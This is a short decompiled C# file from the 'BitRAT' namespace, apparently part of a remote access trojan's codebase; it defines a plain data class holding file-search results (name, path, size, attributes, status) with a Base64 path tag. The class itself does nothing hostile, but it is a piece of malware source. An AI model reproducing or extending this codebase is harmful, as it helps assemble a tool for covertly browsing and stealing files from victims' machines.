﻿using System;
using System.Text;

namespace BitRAT
{
	// Token: 0x020001DF RID: 479
	public class cFileSearch
	{
		// Token: 0x06001AA9 RID: 6825 RVA: 0x000BA87C File Offset: 0x000B8A7C
		public cFileSearch(string sName, string sPath, string sType, string sSize, string sAttr, string sLmod, string sStatus)
		{
			this.NAME = sName;
			this.PATH = sPath;
			this.SIZE = sSize;
			this.TYPE = sType;
			this.ATTR = sAttr;
			this.LMOD = sLmod;
			this.STATUS = sStatus;
			this.TAG = Convert.ToBase64String(Encoding.UTF8.GetBytes(sPath));
		}

		// Token: 0x04000A20 RID: 2592
		public string NAME;

		// Token: 0x04000A21 RID: 2593
		public string PATH;

		// Token: 0x04000A22 RID: 2594
		public string TYPE;

		// Token: 0x04000A23 RID: 2595
		public string SIZE;

		// Token: 0x04000A24 RID: 2596
		public string ATTR;

		// Token: 0x04000A25 RID: 2597
		public string LMOD;

		// Token: 0x04000A26 RID: 2598
		public string STATUS;

		// Token: 0x04000A27 RID: 2599
		public string TAG;
	}
}
